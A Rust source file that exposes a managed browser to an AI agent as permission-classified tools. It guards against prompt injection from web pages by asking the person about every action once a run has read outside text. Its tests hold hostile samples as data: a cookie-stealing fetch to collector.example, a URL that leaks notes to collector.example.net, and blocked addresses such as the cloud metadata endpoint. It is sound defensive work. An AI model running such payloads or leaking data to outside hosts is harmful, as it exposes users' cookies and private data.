//! The managed browser as a [`ToolProvider`] for the tool host (`browser.*`).
//!
//! [`BrowserBackend`] already enforces the site policy, asks before irreversible actions and
//! keeps its own audit. The provider does not repeat that. It maps canonical tool names onto the
//! backend, turns its results into the host's envelope, and tells the host how risky a call is:
//!
//! - Navigating asks the backend's URL policy first. A blocked address is refused before any
//!   prompt; an unknown site is left to the backend, which shows the site prompt itself.
//! - Reading the page is `READ`. Interacting with the page (click, type, select, a key, a tab opened or closed) is `NETWORK` and `WRITE` with an already-authorised target:
//!   until a page has been read the host lets it run and the backend confirms sends, payments, deletes, password fields and uploads; once the run has read outside text,
//!   the host's taint rule asks about every one of them, as the old route does for `browser_click` and the others (a page can tell the model to click and to press Enter).
//!   `tabs` with `list` only looks, so it is `READ`.
//! - Running page JavaScript is `EXECUTE`, and uploading a file to a website is `EXTERNAL_EFFECT`;
//!   both ask every time.

use super::backend::BrowserBackend;
use super::observation::{BrowserErrorCode, BrowserObservation};
use super::policy::{BrowserPolicyConfig, UrlDecision};
use aqua_tool_host::provider::ClassifyContext;
use aqua_tool_host::{
    Annotations, Classification, Decision, ErrorCode, ExecCtx, PermClass, ProviderFuture, ProviderOutput, ToolError, ToolManifest, ToolProvider,
};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::sync::Arc;

#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    Read,
    Navigate,
    Interact,
    Script,
    Upload,
}

/// (host name, backend tool, description, extra schema properties, required, kind)
type Spec = (&'static str, &'static str, &'static str, Value, &'static [&'static str], Kind);

fn specs() -> Vec<Spec> {
    let target = json!({"type": "string", "minLength": 1, "maxLength": 200});
    vec![
        ("browser.navigate", "browser_navigate", "Open a web address in Aqua's browser and return the page.", json!({"url": {"type": "string", "minLength": 1, "maxLength": 2048}}), &["url"], Kind::Navigate),
        ("browser.back", "browser_navigate_back", "Go back one page.", json!({}), &[], Kind::Navigate),
        ("browser.snapshot", "browser_snapshot", "Read the current page as text with element references.", json!({}), &[], Kind::Read),
        ("browser.find", "browser_find", "Search the page text for a word or regular expression.", json!({"text": {"type": "string", "maxLength": 500}, "regex": {"type": "string", "maxLength": 200}}), &[], Kind::Read),
        ("browser.extract", "aqua_browser_extract", "Pull structured data from the page: headlines, search results, tables, article text or links.", json!({"kind": {"type": "string", "maxLength": 40}}), &["kind"], Kind::Read),
        ("browser.screenshot", "browser_take_screenshot", "Take a screenshot of the page (saved as a file).", json!({}), &[], Kind::Read),
        ("browser.console", "browser_console_messages", "Read the page's console messages of a level.", json!({"level": {"type": "string", "enum": ["error", "warning", "info", "debug"]}}), &["level"], Kind::Read),
        ("browser.wait_for", "browser_wait_for", "Wait for text to appear or disappear, or for a number of seconds (at most 30).", json!({"text": {"type": "string", "maxLength": 500}, "textGone": {"type": "string", "maxLength": 500}, "time": {"type": "number", "minimum": 0, "maximum": 30}}), &[], Kind::Read),
        ("browser.tabs", "browser_tabs", "List, open, switch or close tabs.", json!({"action": {"type": "string", "enum": ["list", "new", "select", "close"]}, "index": {"type": "integer", "minimum": 0}, "url": {"type": "string", "maxLength": 2048}}), &["action"], Kind::Interact),
        ("browser.session", "aqua_browser_session", "Report which browser backend is running and its state.", json!({}), &[], Kind::Read),
        ("browser.click", "browser_click", "Click an element by its reference from the last snapshot.", json!({"target": target.clone(), "element": {"type": "string", "maxLength": 200}, "button": {"type": "string"}, "doubleClick": {"type": "boolean"}, "modifiers": {"type": "array", "items": {"type": "string"}}}), &["target"], Kind::Interact),
        ("browser.hover", "browser_hover", "Move the pointer over an element.", json!({"target": target.clone(), "element": {"type": "string", "maxLength": 200}}), &["target"], Kind::Interact),
        ("browser.type", "browser_type", "Type text into an element. Password fields need your approval.", json!({"target": target.clone(), "text": {"type": "string", "maxLength": 10000}, "element": {"type": "string", "maxLength": 200}, "submit": {"type": "boolean"}, "slowly": {"type": "boolean"}}), &["target", "text"], Kind::Interact),
        ("browser.fill_form", "browser_fill_form", "Fill several form fields at once.", json!({"fields": {"type": "array", "minItems": 1, "maxItems": 30, "items": {"type": "object", "additionalProperties": true}}}), &["fields"], Kind::Interact),
        ("browser.select", "browser_select_option", "Choose options in a drop-down.", json!({"target": target.clone(), "element": {"type": "string", "maxLength": 200}, "values": {"type": "array", "minItems": 1, "items": {"type": "string", "maxLength": 200}}}), &["target", "values"], Kind::Interact),
        ("browser.press_key", "browser_press_key", "Press a keyboard key such as Enter or Control+A in the page.", json!({"key": {"type": "string", "minLength": 1, "maxLength": 60}}), &["key"], Kind::Interact),
        ("browser.dialog", "browser_handle_dialog", "Accept or dismiss a page dialog (alert, confirm, prompt).", json!({"accept": {"type": "boolean"}, "promptText": {"type": "string", "maxLength": 500}}), &["accept"], Kind::Interact),
        ("browser.close", "browser_close", "Close the browser page.", json!({}), &[], Kind::Interact),
        ("browser.evaluate", "browser_evaluate", "Run JavaScript in the page. Off unless the policy allows it for the site; always asks.", json!({"function": {"type": "string", "minLength": 1, "maxLength": 4000}, "target": target, "element": {"type": "string", "maxLength": 200}}), &["function"], Kind::Script),
        ("browser.upload", "browser_file_upload", "Upload files from the browser uploads folder to the page. Always asks.", json!({"paths": {"type": "array", "minItems": 1, "maxItems": 10, "items": {"type": "string", "maxLength": 1024}}}), &["paths"], Kind::Upload),
    ]
}

/// The host's name for a backend tool name (`browser_click` is `browser.click`), for the calls that do not go through the host yet.
pub fn host_name_for_wire(wire: &str) -> Option<&'static str> {
    specs().into_iter().find(|s| s.1 == wire).map(|s| s.0)
}

/// The classes a tool of this kind starts from: what its manifest says. The host takes the union of this and what a call adds.
fn kind_classes(name: &str, kind: Kind) -> Vec<PermClass> {
    match kind {
        Kind::Read => vec![PermClass::Read],
        Kind::Navigate => vec![PermClass::Network],
        // The one tool whose "list" only looks starts as a read, and `classify` adds the change for every other action (a missing or unknown action is a change).
        Kind::Interact if name == "browser.tabs" => vec![PermClass::Read],
        Kind::Interact => vec![PermClass::Network, PermClass::Write],
        Kind::Script => vec![PermClass::Execute, PermClass::Network],
        Kind::Upload => vec![PermClass::Network, PermClass::ExternalEffect],
    }
}

/// What the thread that makes a call has said about the questions it puts: that nobody is there to answer them (a flow, a practice run). The backend asks on a thread of its own, so a
/// call made through the host carries this over; without it the question would wait for a person who is not there. Only this way: an approval that a flow holds for one of its own
/// steps (`pre_approved`) is not carried to a call the host makes, so nothing a call through the host asks is answered for the person (card R6-08).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct AskingState {
    unattended: bool,
}

impl AskingState {
    /// What the thread that calls this has said.
    pub(crate) fn of_this_thread() -> Self {
        Self { unattended: super::confirm::is_unattended() }
    }

    /// Makes this the state of the thread that calls it, until the guard that comes back is dropped.
    pub(crate) fn enter(self) -> Option<super::confirm::UnattendedGuard> {
        self.unattended.then(super::confirm::unattended)
    }
}

pub struct BrowserProvider {
    backend: Arc<BrowserBackend>,
}

impl BrowserProvider {
    pub fn new(backend: Arc<BrowserBackend>) -> Self {
        Self { backend }
    }

    fn find(host_name: &str) -> Option<Spec> {
        specs().into_iter().find(|s| s.0 == host_name)
    }

    /// What a call would do under the site policy and the full-access switch **given** (card R6-08), so that the one-door table can ask it without a browser or a
    /// settings file. [`ToolProvider::classify`] is this with the backend's policy and this process's switch, and no run (`run` of `None`).
    ///
    /// `run` is what the host knows of the run. A run that has read outside text is told that an address nobody listed is **not** an allowed target, whatever lets it
    /// open without a question: full access (already so for every run) or the person's own `denylist` mode (so only for such a run: a clean run's opening is the person's
    /// choice and stays free). The host's rule then asks every time, in every mode.
    pub fn classify_with(tool: &str, args: &Value, policy: &BrowserPolicyConfig, full_access: bool, run: Option<&ClassifyContext>) -> Result<Classification, ToolError> {
        let (_, wire, _, _, _, kind) = Self::find(tool).ok_or_else(|| ToolError::new(ErrorCode::NotFound, format!("unknown tool '{tool}'")))?;
        let url = match (tool, args.get("action").and_then(|v| v.as_str())) {
            ("browser.navigate", _) | ("browser.tabs", Some("new")) => args.get("url").and_then(|v| v.as_str()).map(String::from),
            _ => None,
        };
        let mut summary = format!("{wire} in the browser");
        let mut target = "browser".to_string();
        if let Some(u) = &url {
            target = u.clone();
            summary = format!("Open {u}");
            // A blocked address is refused here, before any prompt. An unknown site is the backend's to ask about.
            if let UrlDecision::Deny(reason) = policy.check_url_with(u, full_access) {
                return Err(ToolError::new(ErrorCode::NetworkBlocked, format!("Blocked by browser policy: {reason}")));
            }
        } else if tool == "browser.navigate" {
            return Err(ToolError::new(ErrorCode::InvalidArguments, "browser.navigate requires a url"));
        }
        // The one address that only full access lets through unasked is not an allowed target: a run that has read outside text is asked about it (R6-08). Neither is an address
        // the person's denylist mode lets through, for a run that has read outside text.
        let unlisted_under_full_access = url.as_deref().is_some_and(|u| policy.opens_silently_only_by_full_access(u, full_access));
        let unlisted_after_reading = run.is_some_and(|r| r.tainted) && url.as_deref().is_some_and(|u| policy.opens_unlisted_without_a_question(u, full_access));
        let vouched = !(unlisted_under_full_access || unlisted_after_reading);
        let (classes, allowed) = match kind {
            Kind::Read => (vec![PermClass::Read], true),
            Kind::Interact if tool == "browser.tabs" && args.get("action").and_then(|v| v.as_str()) == Some("list") => (vec![PermClass::Read], true),
            Kind::Navigate => (vec![PermClass::Network], vouched),
            Kind::Interact => (vec![PermClass::Network, PermClass::Write], vouched),
            Kind::Script => {
                // The question shows all of the script or the script is not run: what a question hides is where the harmful part would be put.
                let script = args.get("function").and_then(|v| v.as_str()).unwrap_or("");
                let shown = aqua_tool_host::shown_whole(script, MAX_SHOWN_SCRIPT).map_err(|n| {
                    ToolError::new(ErrorCode::InvalidArguments, format!("this script is {n} characters long and a question can show {MAX_SHOWN_SCRIPT}: it is not run on a question that would hide part of it"))
                })?;
                summary = format!("Run JavaScript in the page: {shown}");
                (vec![PermClass::Execute, PermClass::Network], false)
            }
            Kind::Upload => {
                summary = format!("Upload {} file(s) to the page", args.get("paths").and_then(|v| v.as_array()).map(|a| a.len()).unwrap_or(0));
                (vec![PermClass::Network, PermClass::ExternalEffect], false)
            }
        };
        Ok(Classification { classes, target, summary, target_allowed: allowed })
    }

    /// The classes a call has, from the model's name for the tool (`browser_click`) and its arguments: the tool's own and what the call adds, the union the host works from.
    /// `None` for a name that is not a browser tool. For the questions of the routes that do not go through the host, which show what the call can do as the host's do (card R6-08).
    pub fn classes_of_wire_call(wire: &str, args: &Value, policy: &BrowserPolicyConfig, full_access: bool) -> Option<Vec<PermClass>> {
        let (name, _, _, _, _, kind) = specs().into_iter().find(|s| s.1 == wire)?;
        let mut classes = kind_classes(name, kind);
        if let Ok(class) = Self::classify_with(name, args, policy, full_access, None) {
            for c in class.classes {
                if !classes.contains(&c) {
                    classes.push(c);
                }
            }
        }
        classes.sort();
        Some(classes)
    }

    /// Does this call send something out (card R6-08): a page nobody listed opened with no question, a form submitted by `type`, Enter pressed? Opening a page or typing into
    /// a field changes what is on the screen; these are the ones that can carry what the run holds to somebody else.
    pub fn call_sends_something_out(tool: &str, args: &Value, policy: &BrowserPolicyConfig, full_access: bool) -> bool {
        let truthy = |v: Option<&Value>| match v {
            Some(Value::Bool(b)) => *b,
            Some(Value::String(s)) => matches!(s.trim().to_ascii_lowercase().as_str(), "true" | "1" | "yes"),
            Some(Value::Number(n)) => n.as_f64().is_some_and(|n| n != 0.0),
            _ => false,
        };
        match tool {
            "browser.navigate" => args.get("url").and_then(|v| v.as_str()).is_some_and(|u| policy.opens_unlisted_without_a_question(u, full_access)),
            "browser.tabs" => args.get("action").and_then(|v| v.as_str()) == Some("new") && args.get("url").and_then(|v| v.as_str()).is_some_and(|u| policy.opens_unlisted_without_a_question(u, full_access)),
            "browser.type" => truthy(args.get("submit")),
            "browser.press_key" => {
                let key = args.get("key").and_then(|v| v.as_str()).unwrap_or("").to_ascii_lowercase().replace(' ', "");
                matches!(key.rsplit('+').next().unwrap_or(""), "enter" | "return" | "numpadenter")
            }
            _ => false,
        }
    }
}

/// Map the backend's error vocabulary onto the host's. The backend's own code stays in the message.
pub fn map_error(code: BrowserErrorCode) -> ErrorCode {
    use BrowserErrorCode::*;
    match code {
        InvalidArguments => ErrorCode::InvalidArguments,
        PolicyBlockedOrigin => ErrorCode::NetworkBlocked,
        PolicyToolBlocked | PolicyJsDisabled | PolicyUploadPath => ErrorCode::PermissionDenied,
        ConfirmationRequired => ErrorCode::ApprovalRequired,
        ConfirmationDenied => ErrorCode::ApprovalDenied,
        BrowserNotRunning | BrowserCrashed | ExtensionNotConnected => ErrorCode::Unavailable,
        Timeout => ErrorCode::Timeout,
        StaleRef | DialogBlocking => ErrorCode::Conflict,
        ElementNotFound => ErrorCode::NotFound,
        TabLimit => ErrorCode::ResourceLimit,
        NavigationFailed | BackendError => ErrorCode::BackendError,
    }
}

/// Turn a backend observation into the host's output, or the host's error.
pub fn to_output(obs: BrowserObservation) -> Result<ProviderOutput, ToolError> {
    if let Some(e) = &obs.error {
        let mut msg = format!("{}: {}", e.code.as_str(), e.message);
        if let Some(url) = &obs.url {
            msg.push_str(&format!(" (page: {url})"));
        }
        return Err(ToolError::new(map_error(e.code), msg).with_details(json!({"browser_code": e.code.as_str(), "url": obs.url, "text": obs.text})));
    }
    let mut header = String::new();
    if let Some(u) = &obs.url {
        header.push_str(&format!("Page URL: {u}\n"));
    }
    if let Some(t) = &obs.title {
        header.push_str(&format!("Page Title: {t}\n"));
    }
    let artifacts = obs
        .artifacts
        .iter()
        .map(|a| {
            let bytes = std::fs::read(&a.path).ok();
            aqua_tool_host::Artifact {
                kind: a.kind.clone(),
                path: a.path.clone(),
                bytes: bytes.as_ref().map(|b| b.len() as u64).unwrap_or(0),
                sha256: bytes.map(|b| Sha256::digest(&b).iter().map(|x| format!("{x:02x}")).collect()).unwrap_or_default(),
            }
        })
        .collect();
    let body = if obs.text.is_empty() && header.is_empty() { format!("{} done.", obs.tool) } else { obs.text.clone() };
    let mut warnings = Vec::new();
    if obs.truncated {
        warnings.push("The page text was cut; use browser.find or browser.extract for more.".to_string());
    }
    Ok(ProviderOutput {
        data: json!({"url": obs.url, "title": obs.title, "truncated": obs.truncated, "result": obs.data, "backend": obs.backend, "duration_ms": obs.duration_ms}),
        text: format!("{header}{body}").trim_end().to_string(),
        artifacts,
        warnings,
        secrets: Vec::new(),
        ..Default::default()
    })
}

/// The most characters of a script that a question can show.
const MAX_SHOWN_SCRIPT: usize = 3000;

impl ToolProvider for BrowserProvider {
    fn id(&self) -> &str {
        "browser"
    }

    fn manifests(&self) -> Vec<ToolManifest> {
        specs()
            .into_iter()
            .map(|(name, wire, description, props, required, kind)| {
                // The host takes the union of this and what `classify` adds (see `kind_classes`).
                let classes = kind_classes(name, kind);
                ToolManifest {
                    name: name.into(),
                    title: wire.into(),
                    description: description.into(),
                    classes,
                    default_decision: Decision::Auto,
                    input_schema: json!({"type": "object", "properties": props, "required": required}),
                    timeout_default_ms: 60_000,
                    timeout_max_ms: 120_000,
                    annotations: Annotations { read_only: kind == Kind::Read, destructive: false, idempotent: kind == Kind::Read, open_world: true },
                    // Everything from a web page is content from outside.
                    untrusted_output: true,
                }
            })
            .collect()
    }

    fn classify(&self, tool: &str, args: &Value) -> Result<Classification, ToolError> {
        Self::classify_with(tool, args, &self.backend.policy(), crate::full_access::is_on(), None)
    }

    fn classify_for(&self, tool: &str, args: &Value, ctx: &ClassifyContext) -> Result<Classification, ToolError> {
        Self::classify_with(tool, args, &self.backend.policy(), crate::full_access::is_on(), Some(ctx))
    }

    fn sends_something_out(&self, tool: &str, args: &Value) -> bool {
        Self::call_sends_something_out(tool, args, &self.backend.policy(), crate::full_access::is_on())
    }

    /// The browser is part of the one door (card R6-08): with the switch on, the host decides these calls by the door's rule.
    fn door_applies(&self) -> bool {
        true
    }

    /// A skill's list may name a browser tool as the model writes it (`browser_click`) as well as the host's name (`browser.click`).
    fn restriction_names(&self, tool: &str) -> Vec<String> {
        Self::find(tool).map(|s| vec![s.1.to_string()]).unwrap_or_default()
    }

    fn call<'a>(&'a self, tool: &'a str, args: Value, ctx: &'a ExecCtx) -> ProviderFuture<'a, Result<ProviderOutput, ToolError>> {
        let backend = self.backend.clone();
        let run_cancel = ctx.cancel.clone();
        // The thread that makes the call has said whether anyone can be asked: the backend's own questions are put on another.
        let asking = AskingState::of_this_thread();
        Box::pin(async move {
            let (_, wire, _, _, _, _) = Self::find(tool).ok_or_else(|| ToolError::new(ErrorCode::NotFound, format!("unknown tool '{tool}'")))?;
            // The backend blocks (browser start, page loads, confirmation prompts), so it gets its own thread.
            // If the host stops waiting for this call (its time limit, or a cancel), this future is dropped; the
            // guard then trips the flag the blocking thread watches, so a pending prompt is withdrawn and the click or
            // send is not carried out after the caller was told it timed out.
            let gone = Arc::new(std::sync::atomic::AtomicBool::new(false));
            let mut guard = AbandonOnDrop { flag: gone.clone(), armed: true };
            let flags = vec![gone, run_cancel];
            let obs = tokio::task::spawn_blocking(move || {
                let _bound = super::confirm::bind_abandon(flags);
                let _asking = asking.enter();
                backend.call(wire, args)
            })
            .await
            .map_err(|e| ToolError::new(ErrorCode::BackendError, format!("browser task failed: {e}")))?;
            guard.armed = false;
            to_output(obs)
        })
    }
}

/// Trips the flag of a browser call unless it finished normally.
struct AbandonOnDrop {
    flag: Arc<std::sync::atomic::AtomicBool>,
    armed: bool,
}

impl Drop for AbandonOnDrop {
    fn drop(&mut self) {
        if self.armed {
            self.flag.store(true, std::sync::atomic::Ordering::SeqCst);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::browser_mcp::new_browser_client;

    fn backend(name: &str) -> Arc<BrowserBackend> {
        let root = std::env::temp_dir().join(format!("aqua_bprov_{name}_{}", std::process::id()));
        let _ = std::fs::create_dir_all(&root);
        Arc::new(BrowserBackend::new(&root, new_browser_client()))
    }

    #[test]
    fn every_backend_tool_has_a_valid_canonical_tool() {
        let p = BrowserProvider::new(backend("manifests"));
        let m = p.manifests();
        assert_eq!(m.len(), 20);
        for t in &m {
            t.check().unwrap_or_else(|e| panic!("{e}"));
            assert!(t.name.starts_with("browser."));
        }
        // Everything the backend allows on the managed browser (and the two Aqua tools) is covered, and nothing else.
        let mut wired: Vec<&str> = specs().iter().map(|s| s.1).collect();
        wired.sort();
        let mut allowed: Vec<&str> = super::super::policy::MANAGED_TOOLS.iter().chain(super::super::policy::AQUA_TOOLS.iter()).copied().collect();
        allowed.sort();
        assert_eq!(wired, allowed, "the provider must expose exactly what the backend allows");
    }

    #[test]
    fn dangerous_addresses_are_refused_in_classification() {
        let p = BrowserProvider::new(backend("urls"));
        for url in ["http://169.254.169.254/latest/meta-data/", "file:///C:/Windows/win.ini", "javascript:alert(1)", "http://127.0.0.1:8767/api/v1/status", "not a url", "chrome://settings"] {
            let e = p.classify("browser.navigate", &json!({"url": url})).unwrap_err();
            assert_eq!(e.code, ErrorCode::NetworkBlocked, "{url}");
        }
        let e = p.classify("browser.tabs", &json!({"action": "new", "url": "http://169.254.169.254/"})).unwrap_err();
        assert_eq!(e.code, ErrorCode::NetworkBlocked);
        assert_eq!(p.classify("browser.navigate", &json!({})).unwrap_err().code, ErrorCode::InvalidArguments);
    }

    #[test]
    fn classes_match_the_risk_of_each_kind_of_tool() {
        let p = BrowserProvider::new(backend("classes"));
        let c = |tool: &str, args: Value| p.classify(tool, &args).unwrap();
        assert_eq!(c("browser.snapshot", json!({})).classes, vec![PermClass::Read]);
        assert_eq!(c("browser.click", json!({"target": "e1"})).classes, vec![PermClass::Network, PermClass::Write], "a click changes what a page does: a run that has read outside text is asked");
        assert_eq!(c("browser.press_key", json!({"key": "Enter"})).classes, vec![PermClass::Network, PermClass::Write]);
        assert_eq!(c("browser.type", json!({"target": "e1", "text": "x", "submit": true})).classes, vec![PermClass::Network, PermClass::Write]);
        assert_eq!(c("browser.tabs", json!({"action": "list"})).classes, vec![PermClass::Read], "listing the tabs only looks");
        assert_eq!(c("browser.tabs", json!({"action": "close", "index": 0})).classes, vec![PermClass::Network, PermClass::Write]);
        assert_eq!(c("browser.tabs", json!({})).classes, vec![PermClass::Network, PermClass::Write], "no action named is a change, not a look");
        // The host takes the union of the manifest and the call, so the manifest of the one tool that can only look must not already say Write.
        let manifest = |tool: &str| p.manifests().into_iter().find(|m| m.name == tool).unwrap().classes;
        assert_eq!(manifest("browser.tabs"), vec![PermClass::Read]);
        assert_eq!(manifest("browser.click"), vec![PermClass::Network, PermClass::Write]);
        assert!(c("browser.click", json!({"target": "e1"})).target_allowed);
        let js = c("browser.evaluate", json!({"function": "() => document.title"}));
        assert!(js.classes.contains(&PermClass::Execute) && !js.target_allowed);
        let up = c("browser.upload", json!({"paths": ["a.txt"]}));
        assert!(up.classes.contains(&PermClass::ExternalEffect) && !up.target_allowed);
        let nav = c("browser.navigate", json!({"url": "https://example.com/"}));
        assert_eq!(nav.classes, vec![PermClass::Network]);
        assert!(nav.summary.starts_with("Open https://example.com"));
    }

    #[test]
    fn the_question_about_running_script_in_the_page_shows_all_of_it_or_the_script_is_not_run() {
        let p = BrowserProvider::new(backend("evaluate_prompt"));
        let script = format!("() => {{ {} ; fetch('https://collector.example/?d=' + document.cookie) }}", "/* nothing here */".repeat(100));
        let q = p.classify("browser.evaluate", &json!({"function": script})).unwrap();
        assert!(q.summary.starts_with("Run JavaScript in the page: () => {") && q.summary.contains("document.cookie) }") && !q.summary.contains("not shown"), "{}", q.summary);
        let long = format!("() => {{ {} ; fetch('https://collector.example/?d=' + document.cookie) }}", "/* nothing here */".repeat(400));
        let said = p.classify("browser.evaluate", &json!({"function": long})).unwrap_err();
        assert_eq!(said.code, ErrorCode::InvalidArguments);
        assert!(said.message.contains("not run on a question that would hide part of it"), "{}", said.message);
        let short = p.classify("browser.evaluate", &json!({"function": "() => document.title"})).unwrap();
        assert_eq!(short.summary, "Run JavaScript in the page: () => document.title");
    }

    #[test]
    fn backend_errors_map_to_the_hosts_vocabulary_and_keep_their_own_code() {
        use BrowserErrorCode::*;
        let cases = [
            (PolicyBlockedOrigin, ErrorCode::NetworkBlocked),
            (PolicyToolBlocked, ErrorCode::PermissionDenied),
            (PolicyJsDisabled, ErrorCode::PermissionDenied),
            (ConfirmationDenied, ErrorCode::ApprovalDenied),
            (BrowserNotRunning, ErrorCode::Unavailable),
            (StaleRef, ErrorCode::Conflict),
            (ElementNotFound, ErrorCode::NotFound),
            (TabLimit, ErrorCode::ResourceLimit),
            (Timeout, ErrorCode::Timeout),
        ];
        for (b, want) in cases {
            let err = to_output(BrowserObservation::failure("browser_click", "managed", b, "boom")).unwrap_err();
            assert_eq!(err.code, want, "{b:?}");
            assert!(err.message.starts_with(b.as_str()), "{}", err.message);
            assert_eq!(err.details["browser_code"], b.as_str());
        }
        // The ones that mean "do not try another way" stop the run.
        assert!(ErrorCode::ApprovalDenied.stops_run() && ErrorCode::NetworkBlocked.stops_run() && ErrorCode::PermissionDenied.stops_run());
    }

    #[test]
    fn a_good_observation_becomes_text_data_and_artifacts() {
        let dir = std::env::temp_dir().join(format!("aqua_bprov_art_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let shot = dir.join("s.png");
        std::fs::write(&shot, b"pngbytes").unwrap();
        let mut obs = BrowserObservation::failure("browser_take_screenshot", "managed", BrowserErrorCode::BackendError, "x");
        obs.ok = true;
        obs.error = None;
        obs.url = Some("https://example.com/".into());
        obs.title = Some("Example".into());
        obs.text = "- heading \"Hello\"".into();
        obs.truncated = true;
        obs.artifacts = vec![super::super::observation::Artifact { kind: "screenshot".into(), path: shot.to_string_lossy().to_string() }];
        let out = to_output(obs).unwrap();
        assert!(out.text.starts_with("Page URL: https://example.com/\nPage Title: Example\n"), "{}", out.text);
        assert_eq!(out.artifacts[0].bytes, 8);
        assert_eq!(out.artifacts[0].sha256.len(), 64);
        assert_eq!(out.data["title"], "Example");
        assert_eq!(out.warnings.len(), 1);
    }
}

#[cfg(test)]
mod wire_map_tests {
    use super::*;

    #[test]
    fn every_backend_name_maps_to_its_host_name_and_an_unknown_one_to_nothing() {
        for (name, wire, ..) in specs() {
            assert_eq!(host_name_for_wire(wire), Some(name), "{wire}");
        }
        assert_eq!(host_name_for_wire("browser_click"), Some("browser.click"));
        assert_eq!(host_name_for_wire("local_find"), None);
        assert_eq!(host_name_for_wire("browser.click"), None, "a host name is not a backend name");
        assert_eq!(host_name_for_wire(""), None);
    }
}

#[cfg(test)]
mod door_tests {
    use super::*;
    use super::super::policy::SiteMode;
    use aqua_tool_host::Caller;

    fn policy(mode: SiteMode) -> BrowserPolicyConfig {
        let mut p = BrowserPolicyConfig::default();
        p.mode = mode;
        p.allow = vec!["docs.example.org".into()];
        p
    }

    fn after_reading() -> ClassifyContext {
        ClassifyContext { tainted: true, ..ClassifyContext::clean(Caller::Agent) }
    }

    /// Card R6-08: an address nobody listed is not an allowed target for a run that has read outside text, whatever lets it open without a question (full access,
    /// or the person's own denylist mode); for a clean run nothing changes. The host then asks every time, in every site mode.
    #[test]
    fn a_run_that_read_outside_text_is_told_that_a_site_nobody_listed_is_not_an_allowed_target_in_every_site_mode() {
        let leak = json!({"url": "https://collector.example.net/?d=my+notes"});
        let new_tab = json!({"action": "new", "url": "https://collector.example.net/?d=my+notes"});
        let listed = json!({"url": "https://docs.example.org/page?q=x"});
        let allowed = |mode: SiteMode, full: bool, tainted: bool, tool: &str, args: &Value| {
            let ctx = if tainted { after_reading() } else { ClassifyContext::clean(Caller::Agent) };
            BrowserProvider::classify_with(tool, args, &policy(mode), full, Some(&ctx)).unwrap().target_allowed
        };
        for (tool, args) in [("browser.navigate", &leak), ("browser.tabs", &new_tab)] {
            // Ask mode: without full access the site prompt asks anyway (the backend's, for any run); with it, the address opens silently, so it is not vouched for, read or not.
            assert!(allowed(SiteMode::Ask, false, true, tool, args) && allowed(SiteMode::Ask, false, false, tool, args), "{tool}: the site prompt asks");
            assert!(!allowed(SiteMode::Ask, true, true, tool, args) && !allowed(SiteMode::Ask, true, false, tool, args), "{tool}: full access opens it silently");
            // Denylist mode: a clean run's opening is the person's own choice and stays free; after reading outside text it is not vouched for, with or without full access.
            for full in [false, true] {
                assert!(allowed(SiteMode::Denylist, full, false, tool, args), "{tool} denylist full={full}, a clean run");
                assert!(!allowed(SiteMode::Denylist, full, true, tool, args), "{tool} denylist full={full}, after reading");
            }
        }
        // A listed site is vouched for in every mode, read or not; the allowlist mode refuses what is not listed before anything is asked.
        for mode in [SiteMode::Ask, SiteMode::Denylist, SiteMode::Allowlist] {
            for tainted in [false, true] {
                assert!(allowed(mode, true, tainted, "browser.navigate", &listed), "{mode:?} tainted={tainted}");
            }
        }
        let refused = BrowserProvider::classify_with("browser.navigate", &leak, &policy(SiteMode::Allowlist), true, Some(&after_reading())).unwrap_err();
        assert_eq!(refused.code, ErrorCode::NetworkBlocked);
        // A call with no address, and the other clicks and keys, are vouched for as they were; no run at all is a clean one.
        assert!(allowed(SiteMode::Denylist, true, true, "browser.click", &json!({"target": "e1"})));
        assert!(allowed(SiteMode::Denylist, true, true, "browser.back", &json!({})));
        assert!(!BrowserProvider::classify_with("browser.navigate", &leak, &policy(SiteMode::Ask), true, None).unwrap().target_allowed);
        assert!(BrowserProvider::classify_with("browser.navigate", &leak, &policy(SiteMode::Denylist), true, None).unwrap().target_allowed);
    }

    #[test]
    fn a_call_that_can_carry_what_the_run_holds_out_is_known_to_the_provider_and_a_look_or_a_plain_click_is_not() {
        let sends = |tool: &str, args: Value, mode: SiteMode, full: bool| BrowserProvider::call_sends_something_out(tool, &args, &policy(mode), full);
        let leak = json!({"url": "https://collector.example.net/?d=my+notes"});
        // Opening a page nobody listed with no question: under full access, or in the person's denylist mode. A listed one, or one the policy asks about, is not.
        assert!(sends("browser.navigate", leak.clone(), SiteMode::Ask, true) && sends("browser.navigate", leak.clone(), SiteMode::Denylist, false));
        assert!(!sends("browser.navigate", leak.clone(), SiteMode::Ask, false), "the site prompt asks");
        assert!(!sends("browser.navigate", json!({"url": "https://docs.example.org/"}), SiteMode::Denylist, true));
        assert!(sends("browser.tabs", json!({"action": "new", "url": "https://collector.example.net/"}), SiteMode::Ask, true));
        assert!(!sends("browser.tabs", json!({"action": "close", "index": 0}), SiteMode::Ask, true) && !sends("browser.tabs", json!({"action": "list"}), SiteMode::Ask, true));
        // A form submitted by typing, and Enter by whatever name.
        assert!(sends("browser.type", json!({"target": "e1", "text": "x", "submit": true}), SiteMode::Ask, false));
        assert!(sends("browser.type", json!({"target": "e1", "text": "x", "submit": "true"}), SiteMode::Ask, false));
        assert!(!sends("browser.type", json!({"target": "e1", "text": "x"}), SiteMode::Ask, false) && !sends("browser.type", json!({"target": "e1", "text": "x", "submit": false}), SiteMode::Ask, false));
        for key in ["Enter", "enter", "Control+Enter", "Meta + Enter", "Return", "NumpadEnter"] {
            assert!(sends("browser.press_key", json!({"key": key}), SiteMode::Ask, false), "{key}");
        }
        assert!(!sends("browser.press_key", json!({"key": "Control+A"}), SiteMode::Ask, false) && !sends("browser.press_key", json!({"key": "Tab"}), SiteMode::Ask, false));
        // Looks and plain clicks send nothing.
        for (tool, args) in [("browser.snapshot", json!({})), ("browser.click", json!({"target": "e1"})), ("browser.find", json!({"text": "x"})), ("browser.back", json!({}))] {
            assert!(!sends(tool, args, SiteMode::Denylist, true), "{tool}");
        }
    }

    /// Card R6-08: the backend asks on a thread of its own, so a call through the host carries over that nobody is there to answer (a flow, a practice run), and the thread that took it
    /// on is plain again when it is done. A flow's approval of one of its own steps is not carried: nothing a call through the host asks is answered for the person.
    #[test]
    fn that_nobody_is_there_to_answer_goes_with_the_call_to_the_thread_that_puts_the_questions_and_an_approval_does_not() {
        use super::super::confirm::{is_pre_approved, is_unattended, pre_approved, unattended};
        let there = |s: AskingState| {
            std::thread::spawn(move || {
                let inside = {
